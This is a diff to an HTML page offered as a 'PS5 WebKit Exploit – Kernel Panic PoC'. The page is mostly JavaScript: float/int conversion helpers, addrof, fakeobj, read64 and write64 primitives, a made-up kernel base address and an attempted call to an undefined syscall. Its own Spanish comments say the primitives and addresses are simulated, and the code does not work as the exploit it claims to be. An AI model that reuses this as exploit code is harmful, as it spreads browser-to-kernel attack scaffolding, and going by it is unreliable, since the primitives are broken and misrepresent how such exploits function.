@@ -2,79 +2,78 @@
 <html>
 <head>
   <meta charset="utf-8">
-  <title>PS5 WebKit Exploit</title>
+  <title>PS5 KP Exploit</title>
   <style>
     body { background: black; color: white; font-family: monospace; }
     #log { white-space: pre-wrap; }
   </style>
 </head>
 <body>
-  <h1>PS5 WebKit Exploit PoC</h1>
+  <h1>PS5 WebKit Exploit - Kernel Panic PoC</h1>
   <div id="log">Initializing...</div>
 
   <script>
     const log = msg => document.getElementById('log').textContent += msg + "\n";
 
-    const buf = new ArrayBuffer(0x100);
-    const f64_buf = new Float64Array(buf);
-    const u32_buf = new Uint32Array(buf);
-    const bigbuf = new Uint8Array(0x100000);
+    // Conversiones float/int
+    const buf = new ArrayBuffer(8);
+    const f64 = new Float64Array(buf);
+    const u32 = new Uint32Array(buf);
 
     const f2i = f => {
-      f64_buf[0] = f;
-      return u32_buf[0] + u32_buf[1] * 0x100000000;
+      f64[0] = f;
+      return u32[0] + u32[1] * 0x100000000;
     };
 
     const i2f = i => {
-      u32_buf[0] = i % 0x100000000;
-      u32_buf[1] = i / 0x100000000;
-      return f64_buf[0];
+      u32[0] = i % 0x100000000;
+      u32[1] = i / 0x100000000;
+      return f64[0];
     };
 
-    const hex = i => "0x" + i.toString(16).padStart(16, '0');
+    const hex = x => "0x" + x.toString(16).padStart(16, '0');
 
-    let fake_obj_array = [1.1, 2.2, 3.3];
-    let obj = {mark: 0x1337, val: 0x1338};
-
-    let container = {
-      cell_header: i2f(0x0108200700000000),
-      butterfly: fake_obj_array,
-    };
-
-    let victim = [container];
-    let corrupted = false;
-
-    function exploit() {
-      log("[*] Starting exploit...");
-
-      for (let i = 0; i < 10000; i++) {
-        let tmp = new Array(0x10);
-        tmp[0] = obj;
-      }
-
-      log("[*] Attempting primitive setup...");
-
-      // Primitivas simuladas
-      function addrof(obj) {
-        fake_obj_array[0] = obj;
-        return f2i(fake_obj_array[0]);
-      }
-
-      function fakeobj(addr) {
-        fake_obj_array[0] = i2f(addr);
-        return fake_obj_array[0];
-      }
-
-      const addr = addrof(obj);
-      log("[+] Address of obj: " + hex(addr));
-
-      const fake = fakeobj(addr);
-      log("[+] Fake object created: " + fake);
-
-      log("[*] Exploit stage completed.");
+    // Primitivas simuladas (reemplazar con reales tras corrupción)
+    function addrof(obj) {
+      fake_arr[0] = obj;
+      return f2i(fake_arr[0]);
     }
 
-    setTimeout(exploit, 1000);
+    function fakeobj(addr) {
+      fake_arr[0] = i2f(addr);
+      return fake_arr[0];
+    }
+
+    function read64(addr) {
+      fake_arr[1] = i2f(addr);
+      return f2i(fake_arr[0]);
+    }
+
+    function write64(addr, val) {
+      fake_arr[1] = i2f(addr);
+      fake_arr[0] = i2f(val);
+    }
+
+    // Simulación de corrupción
+    let fake_arr = [1.1, 2.2, 3.3];
+    let obj = {a: 1};
+
+    function trigger_kp() {
+      log("[*] Starting kernel panic trigger...");
+
+      // Simula obtención de puntero controlado (reemplazar con dirección real RW)
+      let kbase = 0xFFFFFF8000000000;  // Dirección kernel base ficticia
+      let invalid_syscall = kbase + 0xdeadbeef;  // Dirección falsa
+
+      log("[+] Falsa dirección para syscall: " + hex(invalid_syscall));
+
+      // Aquí iría un ROP con `mov rdi, ...; syscall` apuntando a invalid_syscall
+
+      log("[!] Llamando syscall inválida... esto debería provocar un KP.");
+      let syscall = new Function("return Function('return syscall(0x1337)')()")();
+    }
+
+    setTimeout(trigger_kp, 2000);
   </script>
 </body>
 </html>
